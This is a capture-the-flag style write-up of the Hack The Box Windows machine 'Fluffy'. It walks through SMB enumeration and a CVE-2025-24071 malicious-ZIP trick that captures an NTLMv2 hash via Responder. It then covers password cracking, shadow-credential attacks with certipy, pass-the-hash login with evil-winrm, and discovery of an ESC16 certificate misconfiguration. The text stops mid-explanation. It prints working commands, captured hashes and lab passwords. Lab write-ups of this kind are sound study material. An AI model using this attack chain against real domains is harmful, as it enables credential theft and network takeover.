
# HTB: Fluffy
**Platform:** [Hack The Box](https://app.hackthebox.com/machines/Fluffy)  
**Difficulty:** `Easy`  
**OS:** `Windows`  
**Description:** `As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!`
---


## Reconnaissance

Today , We will hack a Windows machine from hackthebox named Fluffy. Lets start with initial scanning . I prefer using rustscan firstly to define open ports and then scanning them with nmap).

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Fluffy]
└─$ rustscan -a Fluffy --ulimit 5000 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/home/samurai/.rustscan.toml"
[!] Host "Fluffy" could not be resolved.
[!] No IPs could be resolved, aborting scan.
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Fluffy]
└─$ 
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Fluffy]
└─$ rustscan -a 10.129.232.88 --ulimit 5000 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports like it's my full-time job. Wait, it is.

[~] The config file is expected to be at "/home/samurai/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.232.88:53
Open 10.129.232.88:88
Open 10.129.232.88:139
Open 10.129.232.88:389
Open 10.129.232.88:445
Open 10.129.232.88:593
Open 10.129.232.88:636
Open 10.129.232.88:3269
Open 10.129.232.88:3268
Open 10.129.232.88:464
Open 10.129.232.88:5985
Open 10.129.232.88:9389
Open 10.129.232.88:49667
Open 10.129.232.88:49689
Open 10.129.232.88:49699
Open 10.129.232.88:49709
Open 10.129.232.88:49722
Open 10.129.232.88:49690
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 17:46 +0400
Initiating Ping Scan at 17:46
Scanning 10.129.232.88 [4 ports]
Completed Ping Scan at 17:46, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:46
Completed Parallel DNS resolution of 1 host. at 17:46, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 17:46
Scanning 10.129.232.88 [18 ports]
Discovered open port 139/tcp on 10.129.232.88
Discovered open port 49709/tcp on 10.129.232.88
Discovered open port 53/tcp on 10.129.232.88
Discovered open port 49689/tcp on 10.129.232.88
Discovered open port 49699/tcp on 10.129.232.88
Discovered open port 49722/tcp on 10.129.232.88
Discovered open port 593/tcp on 10.129.232.88
Discovered open port 49667/tcp on 10.129.232.88
Discovered open port 5985/tcp on 10.129.232.88
Discovered open port 445/tcp on 10.129.232.88
Discovered open port 464/tcp on 10.129.232.88
Discovered open port 636/tcp on 10.129.232.88
Discovered open port 49690/tcp on 10.129.232.88
Discovered open port 389/tcp on 10.129.232.88
Discovered open port 9389/tcp on 10.129.232.88
Discovered open port 3268/tcp on 10.129.232.88
Discovered open port 3269/tcp on 10.129.232.88
Discovered open port 88/tcp on 10.129.232.88
Completed SYN Stealth Scan at 17:46, 0.37s elapsed (18 total ports)
Nmap scan report for 10.129.232.88
Host is up, received echo-reply ttl 127 (0.17s latency).
Scanned at 2026-03-31 17:46:30 +04 for 0s

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49699/tcp open  unknown          syn-ack ttl 127
49709/tcp open  unknown          syn-ack ttl 127
49722/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
           Raw packets sent: 22 (944B) | Rcvd: 19 (820B)

                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Fluffy]
└─$ nmap -A -p53,88,139,389,445,464,593,636,3268,3269,5985,9839 10.129.232.88 > nmap.out
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Fluffy]
└─$ cat nmap.out     
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 17:47 +0400
Nmap scan report for 10.129.232.88
Host is up (0.21s latency).

PORT     STATE    SERVICE       VERSION
53/tcp   open     domain        Simple DNS Plus
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-31 20:46:43Z)
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2026-03-31T20:48:16+00:00; +6h59m03s from scanner time.
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-31T20:48:16+00:00; +6h59m04s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2026-03-31T20:48:16+00:00; +6h59m03s from scanner time.
3269/tcp open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-31T20:48:16+00:00; +6h59m04s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9839/tcp filtered unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-31T20:47:36
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m03s, deviation: 0s, median: 6h59m02s

TRACEROUTE (using port 5985/tcp)
HOP RTT       ADDRESS
1   237.43 ms 10.10.14.1
2   237.52 ms 10.129.232.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.41 seconds
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Fluffy]
└─$ 

```


We got our ports and services that running on them , and we can start enumeration with SMB. 
Server Message Block (SMB) in Windows is a network file-sharing protocol that allows applications to read/write files and request services from server programs in a computer network. It is the native method for Windows networking, enabling access to shared files, folders, and printers, often using port 445

## Enumeration

I prefer using netexec (which is alternative and modern version of crackmapexec or cme) to enumerate SMB service.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Fluffy]
└─$ netexec smb 10.129.232.88 -u '' -p '' --shares  
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\: 
SMB         10.129.232.88   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Fluffy]
└─$ netexec smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE      
SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share
```

I first enumerated shares by default as guest user but nothing got and then enumerated shares by credentials provided in Description.
And observed that we have READ and WRITE permissions on IT share and lets see what is inside of that.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Fluffy]
└─$ smbclient //10.129.232.88/IT -U 'j.fleischman%J0elTHEM4n1990!' 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Apr  1 00:52:58 2026
  ..                                  D        0  Wed Apr  1 00:52:58 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 19:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 19:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 19:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 19:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 18:31:07 2025

		5842943 blocks of size 4096. 1495516 blocks available
smb: \> PROMPT off
smb: \> RECURSE on
smb: \> mget *
getting file \Everything-1.4.1.1026.x64.zip of size 1827464 as Everything-1.4.1.1026.x64.zip (185.6 KiloBytes/sec) (average 185.6 KiloBytes/sec)
getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip (864.6 KiloBytes/sec) (average 372.2 KiloBytes/sec)
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (186.9 KiloBytes/sec) (average 360.6 KiloBytes/sec)
getting file \Everything-1.4.1.1026.x64\everything.exe of size 2265104 as Everything-1.4.1.1026.x64/everything.exe (1510.9 KiloBytes/sec) (average 468.4 KiloBytes/sec)
getting file \Everything-1.4.1.1026.x64\Everything.lng of size 958342 as Everything-1.4.1.1026.x64/Everything.lng (821.7 KiloBytes/sec) (average 492.5 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.chm of size 768478 as KeePass-2.58/KeePass.chm (341.4 KiloBytes/sec) (average 474.9 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.exe of size 3305824 as KeePass-2.58/KeePass.exe (1190.4 KiloBytes/sec) (average 564.5 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.exe.config of size 763 as KeePass-2.58/KeePass.exe.config (0.7 KiloBytes/sec) (average 538.4 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.XmlSerializers.dll of size 463264 as KeePass-2.58/KeePass.XmlSerializers.dll (428.8 KiloBytes/sec) (average 533.5 KiloBytes/sec)
getting file \KeePass-2.58\KeePassLibC32.dll of size 609136 as KeePass-2.58/KeePassLibC32.dll (864.6 KiloBytes/sec) (average 542.8 KiloBytes/sec)
getting file \KeePass-2.58\KeePassLibC64.dll of size 785776 as KeePass-2.58/KeePassLibC64.dll (396.6 KiloBytes/sec) (average 532.1 KiloBytes/sec)
getting file \KeePass-2.58\License.txt of size 18710 as KeePass-2.58/License.txt (21.8 KiloBytes/sec) (average 516.3 KiloBytes/sec)
getting file \KeePass-2.58\ShInstUtil.exe of size 97128 as KeePass-2.58/ShInstUtil.exe (93.0 KiloBytes/sec) (average 501.1 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_Common.xsl of size 2732 as KeePass-2.58/XSL/KDBX_Common.xsl (3.4 KiloBytes/sec) (average 487.8 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_DetailsFull_HTML.xsl of size 3556 as KeePass-2.58/XSL/KDBX_DetailsFull_HTML.xsl (4.2 KiloBytes/sec) (average 474.5 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_DetailsLight_HTML.xsl of size 3098 as KeePass-2.58/XSL/KDBX_DetailsLight_HTML.xsl (3.3 KiloBytes/sec) (average 460.4 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_PasswordsOnly_TXT.xsl of size 919 as KeePass-2.58/XSL/KDBX_PasswordsOnly_TXT.xsl (0.9 KiloBytes/sec) (average 445.6 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_Tabular_HTML.xsl of size 3100 as KeePass-2.58/XSL/KDBX_Tabular_HTML.xsl (3.8 KiloBytes/sec) (average 434.7 KiloBytes/sec)
smb: \> exit
```

We connected and saw multiple files exist on share and to get everyting , We used that 3 commands in order and downloaded all of them successfully.

In pdf file , We see multiple CVEs listed and their severity. We searched them and found CVE-2025-24071 
Description is Exposure of sensitive information to an unauthorized actor in Windows File Explorer allows an unauthorized attacker to perform spoofing over a network. You can find its detailed information from https://nvd.nist.gov/vuln/detail/CVE-2025-24071

And we found its exploit here https://www.exploit-db.com/exploits/52310 and run. 


```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Fluffy]
└─$ python3 exploit.py -i 10.129.232.88
[*] Generating malicious .library-ms file...
[+] Created ZIP: output/malicious.zip
[-] Removed intermediate .library-ms file
[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Fluffy]
└─$ ls
Everything-1.4.1.1026.x64  Everything-1.4.1.1026.x64.zip  exploit.py  KeePass-2.58  KeePass-2.58.zip  nmap.out  output  README.md  rustscan.out  Upgrade_Notice.pdf
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Fluffy]
└─$ cd output 
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Fluffy/output]
└─$ ls
malicious.zip
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Fluffy/output]
└─$ smbclient //10.10.14.88/IT -U 'j.fleischman%J0elTHEM4n1990!' 
Try "help" to get a list of possible commands.
smb: \> put malicious.zip
putting file malicious.zip as \malicious.zip (0.3 kB/s) (average 0.3 kB/s)
smb: \> 

```



Note: run responder in TUN0 mode and please run it before putting malicious zip file . 

```bash
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:4f2c345edde92d71:066F4847FF8EEAF599DCDC96420C283F:01010000000000000046D3573AC1DC013FF63A22DBD3B6330000000002000800500036004F004F0001001E00570049004E002D004C0043005000390042003700490055005A005400520004003400570049004E002D004C0043005000390042003700490055005A00540052002E00500036004F004F002E004C004F00430041004C0003001400500036004F004F002E004C004F00430041004C0005001400500036004F004F002E004C004F00430041004C00070008000046D3573AC1DC0106000400020000000800300030000000000000000100000000200000E008079DD939B4176D350657A5AC73F4366C1D4FF587EA82CDEECD536D13D72D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380038000000000000000000
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila

```

PerfecT! We got the NTLM Hash of p.agila user , then we need to crack this with hashcat or johntheripper whatever you want to use

```bash
└─$ john ntlm_hash.txt --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)     
1g 0:00:00:01 DONE (2026-03-31 18:34) 0.7042g/s 3184Kp/s 3184Kc/s 3184KC/s proquis..prison only
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Perfect , prometheusx-303 password found belongs to p.agila user. But I tried to login with evil-winrm but failed, Now we have to use bloodhound to see which user or service we can access with our compromised user.

After researching , We found that our compromised user who is p.agila is a member of Service Accounts manager Group . And this Group has GenericAll permissions on Service Accounts Group and also This Group has GenericWrite permission on Winrm_svc user. We can abuse this for our purpose with impacket tool .

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Fluffy]
└─$ sudo ntpdate 10.129.232.88 
2026-04-01 01:53:14.371552 (+0400) +25143.627048 +/- 0.092081 10.129.232.88 s1 no-leap
CLOCK: time stepped by 25143.627048
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Fluffy]
└─$ impacket-GetUserSPNs -dc-ip 10.129.232.88 fluffy.htb/p.agila:'prometheusx-303' -request-user winrm_svc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-18 04:51:16.786913  2025-05-19 19:13:22.188468             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$f47e49f74d4b219f27e73186f148b0e5$4d7f9a6dff47c4aaa6bf0be972781854297e572c52301067fe5a05429706f8dbc7c806f6968e59cb88e3c60a24fde1e2b45b28413212463f8071c03142fe2953b387944bc290d65c9afb221bfb2bf5d1bb3d57e0327a494f0c929bb16b80706b3715c24412b603b2ce5c4fa4299b6ff1a6dd82beaac5288270d66406a950d4d804031be9ba84fba08ba0164e0e28e6e606e279d10b1dd8985b41e1428f05ddd2b0eb31ef1a86036343576f77a7b8d00adea34a0c291fc2ac217747a248e53e52e769faaa73148d65e8a95970681c40fcf8cb4b847f83e3e28db855812e0d1bf7537d0af0f63fb606658f1723b800fa9bb35d3c5a3d718f4edc123cf432747d171f57ec95c39eb3377d277d0b669c19ded0ab221b0b45c01aca8a6a3ecedcef23d702ed9b41ad88c8feb694dfbd508dfffea490cfe1c2c8089c28bacc8b8951f70487a94aa9a4448407fa7b0835a6c6cb7e20edfef950a9d6164ff8cca643baff23f09ac44c2a93e8d8cd7211a0e5dd258205d7a59511503060ca31aecf11cdd135ca21c6ce9d1ba8112aa2308f9bd2af004f3a77502fc8108101298317e6ef52689ee7393359b8f7ce7b4ec7d82c23f8efbe4939b689cf1320bf0af90a04fa8fba1c9a43e47ed1a9547b175663309a7dba8a83993ff4af62a05f3c0c51c085f227b9378980af9fd3de0144ec1b1b3ef24cc05907078fcb72da684e5e6a7fdeac5321ac0baa978b9fd4c5568d2e2dcfa5ea0fe8c5f2aa050816762ee4323e4bad32a2783519d23f19299ec79613ea76e8b8e2007b63b9fe1973707699054a1273421c2b340365e99042bcd5e875dc2774a491043d860e5c1ac60fc4ddff764a7e33b8d236d10bdbb25fc9b51861e8ab785ae3c6d0494ad8c97dac4babeff5ee14eb238d5ea186ca0cfdd804784b7a2d6641ecbeff0c26161a9ecf8f5a09621ada60298d0e0e74560f8974f6b63663f8825b5d49c4ad62bd379c215ba8f4b7504cbedaddf8301f1d518107d51d7e4d95e7961a52ec8d122bc84d85471d91e2a7858f655600d10449aeb67072aff48491da855ae01fb78ed7b6dfa3b39928ace086c5d7a3019429b24dca910351eee7fe22a1d8420a809b4423d028a13d325f620298d1b00d23e219ad3f897495f76e10613fbadbf65208081d6ef117ee9278aed3594e3e116d4af494d63083e38dd570dc4db434374fb9854c29f98d14b52060e0c85f11a17ef6710a85a52fefa00b1f0ae5bc626a41e999ce7050b8b52edf1b79d13b2055ce937d931569591ff1c752c0db51d9924075c424565ca770f27f788c33ffc6e278cdc09780003d4ec26a936afc56a1f777d1a1e0547af0d79820186a6bb42fe866f7c0fe4ec9d64cb5573cb1df65bc5ddd96497e81490fdd8812dcf2eeb4e4495a980c887b7740a482dbc1341c8e98bf42816d28a10a4dc246ceecad31b17844dfea2bb242485c2f83569e9ee95fea0d3bd97b034ed87543aad908240069
```

Perfect , We got our ticket hash but unfortunately this way did not worked because i tried many ways to crack this but failed. Now we turn our direction to Shadow Attack , first we need to add our user to 'service accounts' group -> 

```bash
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Fluffy/output]
└─$ bloodyAD --host dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb add groupMember 'service accounts' p.agila 
[+] p.agila added to service accounts
```

Then trying to get Hashes of winrm_svc user , we will use certipy tool for this -> 

```bash
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Fluffy/output]
└─$ certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc -dc-ip 10.129.232.88 -target 10.129.232.88
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '0b61db5ad23d4db0932a3ebc090f0f52'
[*] Adding Key Credential with device ID '0b61db5ad23d4db0932a3ebc090f0f52' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '0b61db5ad23d4db0932a3ebc090f0f52' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

Perfect , now we can access winrm by using its hash-> 
```bash
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Fluffy/output]
└─$ evil-winrm -i fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
bce036962d801632d1eee3470813dd65
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> 
```

## Privilege Escalation

After researching, again with certipy we can search vulnerable certificate templates . And on thing that we found a user named ca_svc has access to certificate authority and also that use is a member of service accounts group. it means we can also retrieve hash of ca_svc user 

```bash
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Fluffy/output]
└─$ certipy-ad shadow auto -username p.agila -password 'prometheusx-303' -dc-ip 10.129.232.88 -target 10.129.232.88 -account ca_svc
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '43160686ea264aa19cc894c56556d69d'
[*] Adding Key Credential with device ID '43160686ea264aa19cc894c56556d69d' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '43160686ea264aa19cc894c56556d69d' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

Perfect , lets use certipy to find vulnerable templates-> 

```bash
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Fluffy/output]
└─$ certipy-ad find -username 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.232.88 -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260401025014_Certipy.txt'
[*] Wrote text output to '20260401025014_Certipy.txt'
[*] Saving JSON output to '20260401025014_Certipy.json'
[*] Wrote JSON output to '20260401025014_Certipy.json'
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Fluffy/output]
└─$ cat 20260401025014_Certipy.txt                                                                                            
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

Note: you should add fluffy-DC01-CA to /etc/hosts file.
And here we see we found Web Enrollment has ESC16 vulnerability. 
ESC16: CA-Wide Security Extension Removal
ESC16 represents a critical misconfiguration where the Certificate Authority is configured to omit the szOID_NTDS_CA_SECURITY_EXT extension (OID: 1.3.6.1.4.1.311.25.2) on every certificate it issues.

Technical Details

ESC16 arises when the CA is configured to omit the szOID_NTDS_CA_SECURITY_EXT extension on every certificate it issues. Without this extension, a certificate no longer includes the account's SID, breaking the strong certificate-to-account binding enforced by Windows Server 2022 and later (KB5014754).

Key Difference from ESC9:

